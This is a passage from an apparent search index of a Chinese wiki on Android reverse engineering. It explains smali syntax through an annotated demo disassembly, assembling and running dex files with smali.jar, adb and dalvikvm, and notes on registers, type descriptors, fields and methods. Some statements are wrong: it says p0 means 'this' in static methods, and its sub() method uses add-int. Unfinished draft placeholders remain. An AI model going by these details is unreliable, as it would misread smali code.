java/lang/ String ; ) L java/lang/ StringBuilder ; #\u83b7\u53d6\u4e0a\u4e00\u4e2a\u65b9\u6cd5\u7684\u6267\u884c\u7ed3\u679c,\u6b64\u65f6v1\u4e2d\u5b58\u50a8\u7684\u662fappend()\u65b9\u6cd5\u6267\u884c\u540e\u7684\u7ed3\u679c,\u6b64\u5904\u4e4b\u6240\u4ee5\u4ecd\u7136\u8fd4\u56dev1\u7684 #\u539f\u56e0\u5728\u4e0eappend()\u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f\u81ea\u8eab\u7684\u5f15\u7528 move-result-object v1 #\u7ee7\u7eed\u8c03\u7528append\u65b9\u6cd5(),p0\u8868\u793a\u7b2c\u4e00\u4e2a\u53c2\u6570\u5bc4\u5b58\u5668,\u5373\u4e0a\u9762\u63d0\u5230\u7684result\u53c2\u6570 invoke-virtual { v1 , p0 }, L java/lang/ StringBuilder ; -> append ( I ) L java/lang/ StringBuilder ; #\u540c\u4e0a move-result-object v1 #\u8c03\u7528StringBuilder\u5bf9\u8c61\u7684toString()\u65b9\u6cd5 invoke-virtual { v1 }, L java/lang/ StringBuilder ; -> toString () L java/lang/ String ; #\u83b7\u53d6\u4e0a\u4e00\u4e2a\u65b9\u6cd5\u6267\u884c\u7ed3\u679c,toString()\u65b9\u6cd5\u8fd4\u56de\u4e86\u4e00\u4e2a\u65b0\u7684String\u5bf9\u8c61,\u56e0\u6b64v1\u4e2d\u6b64\u65f6\u5b58\u50a8\u4e86String\u5bf9\u8c61\u7684\u5f15\u7528 move-result-object v1 #\u8c03\u7528Log\u7c7b\u4e2d\u7684\u9759\u6001\u65b9\u6cd5e().\u56e0\u4e3ae()\u662f\u9759\u6001\u65b9\u6cd5,\u56e0\u6b64{v0,v1}\u4e2d\u7684\u6210\u4e86\u53c2\u6570\u5bc4\u5b58\u5668 invoke-static { v0 , v1 }, L android/util/ Log ; -> d ( L java/lang/ String ; L java/lang/ String ; ) I .line 43 #\u8c03\u7528\u8fd4\u56de\u6307\u4ee4,\u6b64\u5904\u6ca1\u6709\u8fd4\u56de\u4efb\u4f55\u503c return-void .end method # virtual methods .method public add ( II ) I .locals 1 .parameter \"x\" #\u7b2c\u4e00\u4e2a\u53c2\u6570 .parameter \"y\" #\u7b2c\u4e8c\u4e2a\u53c2\u6570 .prologue .line 34 #\u8c03\u7528add-int\u6307\u4ee4\u6c42\u548c\u4e4b\u540e\u5c06\u7ed3\u679c\u8d4b\u503c\u7ed9v0\u5bc4\u5b58\u5668 add-int v0 , p1 , p2 #\u8fd4\u56dev0\u5bc4\u5b58\u5668\u4e2d\u7684\u503c return v0 .end method .method public onClick ( L android/view/ View ; ) V .locals 4 .parameter \"view\" #\u53c2\u6570view .prologue const/4 v3 , 0x4 #v3\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3a4 .line 23 #java\u6e90\u6587\u4ef6\u4e2d\u7684\u7b2c23\u884c const/4 v1 , 0x5 #v1\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3a5 #\u8c03\u7528add()\u65b9\u6cd5 invoke-virtual { p0 , v3 , v1 }, L com/social_touch/demo/ MainActivity ; -> add ( II ) I #\u4ecev0\u5bc4\u5b58\u5668\u4e2d\u83b7\u53d6add\u65b9\u6cd5\u7684\u6267\u884c\u7ed3\u679c move-result v0 .line 24 #java\u6e90\u6587\u4ef6\u4e2d\u768424\u884c .local v0 , result : I #v1\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3aPrintStream\u5bf9\u8c61\u7684\u5f15\u7528out sget-object v1 , L java/lang/ System ; -> out : L java/io/ PrintStream ; #\u6267\u884cout\u5bf9\u8c61\u7684println()\u65b9\u6cd5 invoke-virtual { v1 , v0 }, L java/io/ PrintStream ; -> println ( I ) V .line 26 const/16 v1 , 0x9 #v1\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3a9 const/4 v2 , 0x3 #v2\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3a3 #\u8c03\u7528sub()\u65b9\u6cd5,{p0,v1,v2},p0\u6307\u7684\u662fthis,\u5373\u5f53\u524d\u5bf9\u8c61,v1,v2\u5219\u662f\u53c2\u6570 invoke-virtual { p0 , v1 , v2 }, L com/social_touch/demo/ MainActivity ; -> sub ( II ) I #\u4ecev0\u5bc4\u5b58\u5668\u4e2d\u83b7\u53d6sub()\u65b9\u6cd5\u7684\u6267\u884c\u7ed3\u679c move-result v0 .line 28 if-le v0 , v3 , :cond_0 #\u5982\u679cv0\u5bc4\u5b58\u5668\u7684\u503c\u5c0f\u4e8ev3\u5bc4\u5b58\u5668\u4e2d\u7684\u503c,\u5219\u8df3\u8f6c\u5230cond_0\u5904\u7ee7\u7eed\u6267\u884c .line 29 #\u8c03\u7528\u9759\u6001\u65b9\u6cd5log() invoke-static { v0 }, L com/social_touch/demo/ MainActivity ; -> log ( I ) V .line 31 :cond_0 return-void .end method .method protected onCreate ( L android/os/ Bundle ; ) V .locals 1 .parameter \"savedInstanceState\" #\u53c2\u6570savedInstancestate .prologue .line 17 #\u8c03\u7528\u7236\u7c7b\u65b9\u6cd5onCreate() invoke-super { p0 , p1 }, L android/app/ Activity ; -> onCreate ( L android/os/ Bundle ; ) V .line 18 const v0 , 0x7f04001a #v0\u5bc4\u5b58\u5668\u8d4b\u503c\u4e3a0x7f04001a #\u8c03\u7528\u65b9\u6cd5setContentView() invoke-virtual { p0 , v0 }, L com/social_touch/demo/ MainActivity ; -> setContentView ( I ) V .line 19 return-void .end method #declared-synchronized\u8868\u793a\u8be5\u65b9\u6cd5\u662f\u540c\u6b65\u65b9\u6cd5 .method public declared-synchronized sub ( II ) I .locals 1 .parameter \"x\" .parameter \"y\" .prologue .line 38 monitor-enter p0 #\u4e3a\u8be5\u65b9\u6cd5\u6dfb\u52a0\u9501\u5bf9\u8c61p0 add-int v0 , p1 , p2 #\u91ca\u653e\u9501\u5bf9\u8c61 monitor-exit p0 return v0 .end method \u7f16\u8bd1-smali2dex \u00b6 \u7ed9\u5b9a\u4e00\u4e2a smali \u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u65b9\u5f0f\u5c06 smali \u6587\u4ef6\u7f16\u8bd1\u4e3a dex \u6587\u4ef6\u3002 java -jar smali.jar assemble src.smali -o src.dex \u5176\u4e2d\uff0csmali.jar \u6765\u81ea\u4e8e https://bitbucket.org/JesusFreke/smali/overview \u3002 \u8fd0\u884c smali \u00b6 \u5728\u5c06 smali \u6587\u4ef6\u7f16\u8bd1\u6210 dex \u6587\u4ef6\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u4e00\u6b65\u6267\u884c \u9996\u5148\uff0c\u4f7f\u7528 adb \u5c06 dex \u6587\u4ef6 push \u5230\u624b\u673a\u4e0a adb push main.dex /sdcard/ \u5176\u6b21\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u6267\u884c adb shell dalvikvm -cp /sdcard/main.dex main \u5176\u4e2d \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 dalvikvm \u547d\u4ee4\u3002 -cp \u6307\u7684\u662f classpath \u8def\u5f84\uff0c\u8fd9\u91cc\u5c31\u662f /sdcard/main.dex\u3002 main \u6307\u7684\u662f\u7c7b\u540d\u3002 \u53c2\u8003\u9605\u8bfb \u00b6 Android \u8f6f\u4ef6\u5b89\u5168\u4e0e\u9006\u5411\u5206\u6790 http://blog.csdn.net/wizardforcel/article/details/54730253 http://blog.csdn.net/dd864140130/article/details/52076515","title":"Smali \u4ecb\u7ecd"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#smali","text":"","title":"Smali"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_1","text":"\u5728\u6267\u884c Android Java \u5c42\u7684\u4ee3\u7801\u65f6\uff0c\u5176\u5b9e\u5c31\u662f Dalvik(ART) \u865a\u62df\u673a\uff08\u4f7f\u7528 C\u6216 C++ \u4ee3\u7801\u5b9e\u73b0\uff09\u5728\u89e3\u6790 Dalvik \u5b57\u8282\u7801\uff0c\u4ece\u800c\u6a21\u62df\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u3002 \u81ea\u7136\uff0cDalvik \u5b57\u8282\u7801\u6666\u6da9\u96be\u61c2\uff0c\u7814\u7a76\u4eba\u5458\u4eec\u7ed9\u51fa\u4e86 Dalvik \u5b57\u8282\u7801\u7684\u4e00\u79cd\u52a9\u8bb0\u65b9\u5f0f\uff1asmali \u8bed\u6cd5\u3002\u901a\u8fc7\u4e00\u4e9b\u5de5\u5177\uff08\u5982 apktool\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u5df2\u6709\u7684 dex \u6587\u4ef6\u8f6c\u5316\u4e3a\u82e5\u5e72\u4e2a smali \u6587\u4ef6\uff08 \u4e00\u822c\u800c\u8a00\uff0c\u4e00\u4e2a smali \u6587\u4ef6\u5bf9\u5e94\u7740\u4e00\u4e2a\u7c7b \uff09\uff0c\u7136\u540e\u8fdb\u884c\u9605\u8bfb\u3002\u5bf9\u4e8e\u4e0d\u540c\u7684\u5de5\u5177\u6765\u8bf4\uff0c\u5176\u8f6c\u6362\u540e\u7684 smali \u4ee3\u7801\u4e00\u822c\u90fd\u4e0d\u4e00\u6837\uff0c\u6bd5\u7adf\u8fd9\u4e2a\u8bed\u6cd5\u4e0d\u662f\u5b98\u65b9\u7684\u6807\u51c6\u3002\u8fd9\u91cc\u6211\u4eec\u4ecb\u7ecd\u6bd4\u8f83\u901a\u7528\u7684\u8bed\u6cd5\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728smali \u8bed\u6cd5\u4e2d\uff0c\u4f7f\u7528\u7684\u90fd\u662f\u5bc4\u5b58\u5668\uff0c\u4f46\u662f\u5176\u5728\u89e3\u91ca\u6267\u884c\u7684\u65f6\u5019\uff0c\u5f88\u591a\u90fd\u4f1a\u6620\u5c04\u5230\u6808\u4e2d\u3002 \u611f\u89c9\u4f3c\u4e4e\u8fd9\u91cc\u7ed9\u4e2a\u4f8b\u5b50\u6bd4\u8f83\u5408\u9002\uff01\uff01\uff01\uff01\uff01","title":"\u4ecb\u7ecd"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_2","text":"\u4e00\u4e2a Smali \u6587\u4ef6\u7684\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u57fa\u672c\u7c7b\u4fe1\u606f \u524d\u4e09\u884c\u63cf\u8ff0\u8f6c\u6362\u4e3a\u8be5 Smali \u6587\u4ef6\u7684\u7c7b\u7684\u4fe1\u606f \u5982\u679c\u7c7b\u5b9e\u73b0\u4e86\u63a5\u53e3\uff0c\u5bf9\u5e94\u7684\u63a5\u53e3\u4fe1\u606f \u5982\u679c\u7c7b\u4f7f\u7528\u4e86\u6ce8\u89e3\uff0c\u5bf9\u5e94\u7684\u6ce8\u89e3\u4fe1\u606f \u5b57\u6bb5\u63cf\u8ff0 \u65b9\u6cd5\u63cf\u8ff0 \u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0cSmali \u4ee3\u7801\u57fa\u672c\u4e0a\u8fd8\u539f\u4e86 java \u4ee3\u7801\u4e2d\u542b\u4e49\u3002\u5b83\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u79cd\u7c7b\u578b\u7684\u8bed\u53e5 \u58f0\u660e\u8bed\u53e5\u7528\u6765\u58f0\u660e java \u4e2d\u81ea\u9876\u5411\u4e0b\u7684\u7c7b\uff0c\u65b9\u6cd5\uff0c\u53d8\u91cf\u7c7b\u578b\uff0c\u4ee5\u53ca\u6bcf\u4e2a\u65b9\u6cd5\u4e2d\u6240\u8981\u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u7684\u4e2a\u6570\u7b49\u4fe1\u606f\u3002 \u6267\u884c\u8bed\u53e5\u6765\u6267\u884c java \u4e2d\u7684\u6bcf\u4e00\u884c\u4ee3\u7801\uff0c\u5305\u542b\u65b9\u6cd5\u7684\u8c03\u7528\uff0c\u5b57\u6bb5\u7684\u8bfb\u5199\uff0c\u5f02\u5e38\u7684\u6355\u6349\u7b49\u64cd\u4f5c\u3002 \u6574\u4f53\u6765\u8bf4\uff0cSmali \u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u8fd8\u662f\u6bd4\u8f83\u5f3a\u7684\u3002","title":"\u57fa\u672c\u7ed3\u6784"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_3","text":"\u5728 smali \u4ee3\u7801\u4e2d\uff0c\u58f0\u660e\u8bed\u53e5\u4e00\u822c\u90fd\u662f\u4ee5 . \u5f00\u59cb\u3002","title":"\u58f0\u660e\u8bed\u53e5"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_4","text":"\u76ee\u524d\uff0cDalvik \u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u90fd\u662f 32 \u4f4d\uff0c\u5bf9\u4e8e 64 \u4f4d\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u5982 double \u7c7b\u578b\uff0c\u5b83\u4f1a\u4f7f\u7528\u4e24\u4e2a\u76f8\u90bb\u7684 32 \u4f4d\u5bc4\u5b58\u5668\u6765\u8868\u793a\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u77e5\u9053 Dalvik \u6700\u591a\u652f\u6301 65536 \u4e2a\u5bc4\u5b58\u5668(\u7f16\u53f7\u4ece 0~65535 )\uff0c\u4f46\u662f ARM \u67b6\u6784\u7684 cpu \u4e2d\u53ea\u6709 37 \u4e2a\u5bc4\u5b58\u5668\u3002\u90a3 Dalvik \u662f\u600e\u4e48\u505a\u7684\u5462\uff1f\u5176\u5b9e\uff0c\u6bcf\u4e2a Dalvik \u865a\u62df\u673a\u7ef4\u62a4\u4e86\u4e00\u4e2a\u8c03\u7528\u6808\uff0c\u8be5\u8c03\u7528\u6808\u7528\u6765\u652f\u6301\u865a\u62df\u5bc4\u5b58\u5668\u548c\u771f\u5b9e\u5bc4\u5b58\u5668\u76f8\u4e92\u6620\u5c04\u7684\u3002","title":"\u5bc4\u5b58\u5668"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_5","text":"\u5728\u6267\u884c\u5177\u4f53\u65b9\u6cd5\u65f6\uff0cDalvik \u4f1a\u6839\u636e .registers \u6307\u4ee4\u6765\u786e\u5b9a\u8be5\u51fd\u6570\u8981\u7528\u5230\u7684\u5bc4\u5b58\u5668\u6570\u76ee\uff0c\u865a\u62df\u673a\u4f1a\u6839\u636e\u7533\u8bf7\u7684\u5bc4\u5b58\u5668\u7684\u6570\u76ee\u6765\u4e3a\u8be5\u65b9\u6cd5\u5206\u914d\u76f8\u5e94\u5927\u5c0f\u7684\u6808\u7a7a\u95f4\uff0cdalvik \u5728\u5bf9\u8fd9\u4e9b\u5bc4\u5b58\u5668\u64cd\u4f5c\u65f6\uff0c\u5176\u5b9e\u90fd\u662f\u5728\u64cd\u4f5c\u6808\u7a7a\u95f4\u3002","title":"\u5bc4\u5b58\u5668\u58f0\u660e"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_6","text":"\u4e00\u4e2a\u65b9\u6cd5\u6240\u7533\u8bf7\u7684\u5bc4\u5b58\u5668\u4f1a\u5206\u914d\u7ed9\u51fd\u6570\u65b9\u6cd5\u7684\u53c2\u6570 (parameter) \u4ee5\u53ca\u5c40\u90e8\u53d8\u91cf (local variable) \u3002\u5728 smali \u4e2d\uff0c\u4e00\u822c\u6709\u4e24\u79cd\u547d\u540d\u89c4\u5219 v \u547d\u540d\u6cd5 p \u547d\u540d\u6cd5 \u5047\u8bbe\u65b9\u6cd5\u7533\u8bf7\u4e86 m+n \u4e2a\u5bc4\u5b58\u5668\uff0c\u5176\u4e2d\u5c40\u90e8\u53d8\u91cf\u5360 m \u4e2a\u5bc4\u5b58\u5668\uff0c\u53c2\u6570\u5360 n \u4e2a\u5bc4\u5b58\u5668\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684\u547d\u540d\u89c4\u5219\uff0c\u5176\u76f8\u5e94\u7684\u547d\u540d\u5982\u4e0b \u5c5e\u6027 v\u547d\u540d\u6cd5 p\u547d\u540d\u6cd5 \u5c40\u90e8\u53d8\u91cf v_0,v_1,...,v_{m-1} v_0,v_1,...,v_{m-1} v_0,v_1,...,v_{m-1} v_0,v_1,...,v_{m-1} \u51fd\u6570\u53c2\u6570 v_m,v_{m+1},...,v_{m+n} v_m,v_{m+1},...,v_{m+n} p_0,p_1,...,p_{n-1} p_0,p_1,...,p_{n-1} \u4e00\u822c\u6765\u8bf4\u6211\u4eec\u66f4\u503e\u5411\u4e8e p \u547d\u540d\u6cd5\uff0c\u56e0\u4e3a\u5176\u5177\u6709\u8f83\u597d\u7684\u53ef\u8bfb\u6027\uff0c\u53ef\u4ee5\u65b9\u4fbf\u5730\u8ba9\u6211\u4eec\u77e5\u9053\u5bc4\u5b58\u5668\u5c5e\u4e8e\u54ea\u4e00\u79cd\u7c7b\u578b\u3002 \u800c\u8fd9\u5176\u5b9e\u4e5f\u5c31\u662f smali \u8bed\u6cd5\u4e2d\u5e38\u89c1\u7684\u5bc4\u5b58\u5668\u547d\u540d\u89c4\u5219\uff0cp \u5f00\u5934\u7684\u5bc4\u5b58\u5668\u90fd\u662f\u53c2\u6570\u5bc4\u5b58\u5668\uff0cv \u5f00\u5934\u7684\u5bc4\u5b58\u5668\u90fd\u662f\u5c40\u90e8\u53d8\u91cf\u5bc4\u5b58\u5668\uff0c\u4e24\u8005\u7684\u6570\u91cf\u4e4b\u548c\u4e3a\u65b9\u6cd5\u7533\u8bf7\u7684\u5bc4\u5b58\u5668\u6570\u91cf\u3002","title":"\u5bc4\u5b58\u5668\u547d\u540d\u89c4\u5219"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_7","text":"\u5728 Dalvik \u5b57\u8282\u7801\u4e2d\uff0c\u53d8\u91cf\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\u7c7b\u578b \u7c7b\u578b \u6210\u5458 \u57fa\u672c\u7c7b\u578b boolean\uff0cbyte\uff0cshort\uff0cchar\uff0cint\uff0clong\uff0cfloat\uff0cdouble\uff0cvoid\uff08\u53ea\u7528\u4e8e\u8fd4\u56de\u503c\u7c7b\u578b\uff09 \u5f15\u7528\u7c7b\u578b \u5bf9\u8c61\uff0c\u6570\u7ec4 \u4f46\u662f\uff0c\u6211\u4eec\u5728 smali \u4e2d\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u628a\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\u7684\u63cf\u8ff0\u7684\u5168\u79f0\u5168\u90e8\u653e\u8fdb\u53bb\uff0c\u6211\u4eec\u53ea\u9700\u8981\u53ef\u4ee5\u8bc6\u522b\u5b83\u5373\u53ef\uff0c\u90a3\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u53ef\u4ee5\u5bf9\u5b83\u8fdb\u884c\u7b80\u5199\u554a\u3002dalvik \u4e2d\u7b80\u5199\u65b9\u5f0f\u5982\u4e0b java\u7c7b\u578b \u7c7b\u578b\u63cf\u8ff0\u7b26 boolean Z byte B short S char C int I long J float F double D void V \u5bf9\u8c61\u7c7b\u578b L \u6570\u7ec4\u7c7b\u578b [ \u5176\u4e2d\u5bf9\u8c61\u7c7b\u578b\u53ef\u4ee5\u8868\u793aJava\u4ee3\u7801\u4e2d\u7684\u6240\u6709\u7c7b\u3002\u6bd4\u5982\u8bf4\u5982\u679c\u4e00\u4e2a\u7c7b\u5728java\u4ee3\u7801\u4e2d\u7684\u4ee5package.name.ObjectName\uff08\u5168\u540d\uff09\u7684\u65b9\u5f0f\u88ab\u5f15\u7528\uff0c\u90a3\u4e48\u5728Davilk\u4e2d\uff0c\u5176\u63cf\u8ff0\u5219\u662f Lpackage/name/ObjectName; \uff0c\u5176\u4e2d L\u5373\u4e0a\u9762\u6240\u8bf4\u7684\u5bf9\u8c61\u7c7b\u578b\u3002 \u5168\u540d\u4e2d\u7684 . \u88ab\u66ff\u6362\u4e3a / \u3002 \u540e\u9762\u8ddf\u4e86\u4e00\u4e2a ; \u3002 \u6bd4\u5982\u8bf4\u5728 java.lang.String \uff0c\u5176\u76f8\u5e94\u7684\u5f62\u5f0f\u4e3a Ljava/lang/String; \u6ce8\uff1a\u6240\u8c13\u5168\u540d\u5c31\u662f\u5b83\u7684\u5168\u7a0b\u4e0d\u4ec5\u4ec5\u662f\u7b80\u5199\uff0c\u6bd4\u5982String\u5176\u5b9e\u662fjava.lang.String\u3002 \u6570\u7ec4\u7c7b\u578b\u53ef\u4ee5\u8868\u793ajava\u4e2d\u7684\u6240\u6709\u6570\u7ec4\u3002\u5176\u4e00\u822c\u7684\u6784\u6210\u5f62\u5f0f\u7531\u524d\u5411\u540e\u4f9d\u6b21\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206 \u6570\u7ec4\u7ef4\u6570 \u4e2a[\uff0c\u4f46\u6570\u7ec4\u7684\u7ef4\u6570\u6700\u591a\u4e3a255\u3002 \u6570\u636e\u5143\u7d20\u7c7b\u578b\uff0c\u8fd9\u91cc\u7684\u7c7b\u578b\u81ea\u7136\u5c31\u4e0d\u80fd\u662f[\u4e86\u3002 \u6bd4\u5982\u8bf4int\u6570\u7ec4 int [] \u5728smali\u4e2d\u7684\u8868\u793a\u5f62\u5f0f\u4e3a [I \u3002 \u6bd4\u5982\u8bf4\u6570\u7ec4\u7c7b\u578b String[][] \u5728smali\u4e2d\u7684\u8868\u793a\u5f62\u5f0f\u4e3a [[Ljava/lang/String; \u3002","title":"\u53d8\u91cf\u7c7b\u578b"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_8","text":"\u5728 java \u7684\u7c7b\u4e2d\uff0c\u4e00\u822c\u90fd\u4f1a\u6709\u6210\u5458\u53d8\u91cf\uff0c\u4e5f\u79f0\u4e3a\u5176\u5c5e\u6027\u6216\u8005\u5b57\u6bb5\u3002java\u4e2d\u7684\u5b57\u6bb5\u5206\u4e3a \u666e\u901a\u5b57\u6bb5\uff0c\u5b9e\u4f8b\u5c5e\u6027 \u9759\u6001\u5b57\u6bb5\uff0c\u7c7b\u5c5e\u6027\uff0c\u6240\u6709\u7684\u7c7b\u5b9e\u4f8b\u5171\u4eab\u3002","title":"\u5b57\u6bb5"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_9","text":"\u58f0\u660e\u5982\u4e0b #instance fields .field <\u8bbf\u95ee\u6743\u9650\u4fee\u9970\u7b26> [\u975e\u6743\u9650\u4fee\u9970\u7b26] <\u5b57\u6bb5\u540d>:<\u5b57\u6bb5\u7c7b\u578b> \u5176\u4e2d\u8bbf\u95ee\u6743\u9650\u4fee\u9970\u7b26\u53ef\u4ee5\u4e3a public private protected \u975e\u6743\u9650\u4fee\u9970\u7b26\u53ef\u4ee5\u4e3a( \u67e5\u660e\u5176\u7528\u6cd5!!! ) final volidate transient \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5982\u4e0b # instance fields .field private str1 : L java/lang/ String ; \u8fd9\u91cc\u58f0\u660e\u5176\u5b9e\u5982\u4e0b private java . lang . String str1 ;","title":"\u666e\u901a\u5b57\u6bb5"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_10","text":"\u4e00\u822c\u8868\u793a\u5982\u4e0b #static fields .field <\u8bbf\u95ee\u6743\u9650> static [ \u4fee\u9970\u8bcd] <\u5b57\u6bb5\u540d> : <\u5b57\u6bb5\u7c7b\u578b> \u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u4ecb\u7ecd\u76f8\u5e94\u5185\u5bb9\u4e86\uff0c\u76f4\u63a5\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 # instance fields .field public static str2:Ljava/lang/String; \u5176\u5b9e\u58f0\u660e\u5982\u4e0b public static java . lang . String str2 ;","title":"\u9759\u6001\u5b57\u6bb5"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_11","text":"\u5728 smali \u4ee3\u7801\u4e2d\uff0c\u65b9\u6cd5\u4e00\u822c\u7684\u5c55\u73b0\u5f62\u5f0f\u5982\u4e0b # \u63cf\u8ff0\u65b9\u6cd5\u7c7b\u578b .method <\u8bbf\u95ee\u6743\u9650\u4fee\u9970\u7b26> [\u4fee\u9970\u7b26] <\u65b9\u6cd5\u539f\u578b> <.locals> [.parameter] [.prologue] [.line] <\u4ee3\u7801\u903b\u8f91> [.line] <\u4ee3\u7801\u903b\u8f91> .end \u5176\u4e2d\u7b2c\u4e00\u884c\u4ee5\u6ce8\u91ca\u5f62\u5f0f\u63cf\u8ff0\u65b9\u6cd5\u7684\u7c7b\u578b\uff0c\u4e00\u822c\u662f\u53cd\u7f16\u8bd1\u5de5\u5177\u6dfb\u52a0\u4e0a\u53bb\u7684\uff0c\u5206\u4e3a\u4e24\u79cd\u7c7b\u578b \u76f4\u63a5\u65b9\u6cd5\uff0cdirect method \u865a\u65b9\u6cd5\uff0cvirtual method \u8bbf\u95ee\u6743\u9650\u53ef\u80fd\u6709\u6709\u4ee5\u4e0b\u5f62\u5f0f\uff0c\u4e0e java \u4e2d\u7684\u4e00\u4e00\u5bf9\u5e94 public private protected \u4fee\u9970\u7b26\u4e3b\u8981\u6709\u4ee5\u53d6\u503c\u8303\u56f4 static\uff0c\u8868\u660e\u8be5\u65b9\u6cd5\u662f\u9759\u6001\u65b9\u6cd5 \u65b9\u6cd5\u539f\u578b\u4e00\u822c\u4e3a \u65b9\u6cd5\u540d(\u53c2\u6570\u7c7b\u578b\u63cf\u8ff0\u7b26)\u8fd4\u56de\u503c\u7c7b\u578b\u63cf\u8ff0\u7b26 \u3002\u4e0ejava\u65b9\u6cd5\u4e2d\u4e0d\u4e00\u6837\u7684\u662f\uff0c\u5728 smali \u7684\u8fd9\u4e2a\u65b9\u6cd5\u539f\u578b\u4e2d\u4e0d\u4f1a\u6709\u53c2\u6570\u5bf9\u5e94\u7684\u540d\u5b57\u7684\uff0c\u5bf9\u5e94\u53c2\u6570\u7684\u540d\u5b57\u53ef\u80fd\u4f1a\u5728.parameter\u4e2d\u8fdb\u884c\u6307\u5b9a\u3002 .locals \u4f1a\u6307\u5b9a\u65b9\u6cd5\u4f7f\u7528\u7684\u5c40\u90e8\u53d8\u91cf\u3002 .parameter \u7684\u4e2a\u6570\u4e0e\u65b9\u6cd5\u7684\u4f7f\u7528\u7684\u53c2\u6570\u683c\u5f0f\u4e00\u81f4\uff0c\u6bcf\u4e00\u6761\u8bed\u53e5\u58f0\u660e\u4e00\u4e2a\u53c2\u6570\u3002\u5982\u679c\u65b9\u6cd5\u662f\u9759\u6001\u65b9\u6cd5\u7684\u8bdd\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528 p0 \u6765\u8868\u793athis\uff0c\u5373\u5f53\u524d\u5bf9\u8c61\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u53c2\u6570\u5c31\u6b63\u5e38\u7528 p0 \u5f00\u59cb\u3002 .prologue \u6307\u5b9a\u7a0b\u5e8f\u7684\u5f00\u59cb\u5904\u3002\u6df7\u6dc6\u8fc7\u540e\u7684\u4ee3\u7801\u53ef\u80fd\u4f1a\u6ca1\u6709\u8fd9\u4e00\u8bf4\u660e\u3002 .line \u6307\u5b9a\u76f8\u5e94\u7684\u4ee3\u7801\u5728\u539f java \u6587\u4ef6\u7684\u884c\u6570\u3002\u5982\u679c\u7a0b\u5e8f\u8fdb\u884c\u4e86\u6df7\u6dc6\uff0c\u4e00\u822c\u5c31\u4e0d\u4f1a\u6709\u8fd9\u4e00\u884c\u4e86\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\uff0c\uff0c\uff0c\u627e\u4e2a\u5408\u9002\u7684\u4f8b\u5b50!!!!!!","title":"\u65b9\u6cd5"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_12","text":"","title":"\u7c7b"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_13","text":"\u5982\u4e0b .class <\u8bbf\u95ee\u6743\u9650\u4fee\u9970\u7b26> [\u975e\u6743\u9650\u4fee\u9970\u7b26] <\u7c7b\u540d> .super <\u7236\u7c7b\u540d> .source <\u6e90\u6587\u4ef6\u540d\u79f0> \u5176\u4e2d\uff0c <> \u4e2d\u7684\u5185\u5bb9\u5fc5\u987b\u5b58\u5728\uff0c [] \u7684\u5185\u5bb9\u662f\u53ef\u9009\u7684\u3002\u8bbf\u95ee\u6743\u9650\u4fee\u9970\u7b26\u5373\u6240\u8c13\u7684 public \uff0c protected \uff0c private \u3002\u800c\u975e\u6743\u9650\u4fee\u9970\u7b26\u5219\u6307\u7684\u662f final \uff0c abstract \u3002\u4e3e\u4e2a\u4f8b\u5b50 .class public final L com/a/b/ c ; .super L java/lang/ Object ; .source \"Demo.java\" \u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u7c7b\u7684\u8bbf\u95ee\u6743\u9650\u662f public \uff0c\u975e\u6743\u9650\u4fee\u9970\u7b26\u4e3a final \uff0c\u7c7b\u540d\u4e3a com.a.b.c \uff0c\u5b83\u7ee7\u627f\u4e86\u7236\u7c7b java.lang.object \uff0c\u5bf9\u5e94\u7684\u6e90\u6587\u4ef6\u4e3a Demo.java \u3002","title":"\u57fa\u672c\u7c7b\u4fe1\u606f"},{"location":"android/basic_operating_mechanism/java_layer/smali/smali/#_14","text":"\u5982\u679c\u4e00\u4e2a\u7c7b\u5b9e\u73b0\u4e86\u67d0\u4e2a\u63a5\u53e3\uff0c\u5219\u4f1a\u901a\u8fc7 .implements \u8fdb\u884c\uff0c\u5982\u4e0b: #interfaces .implements 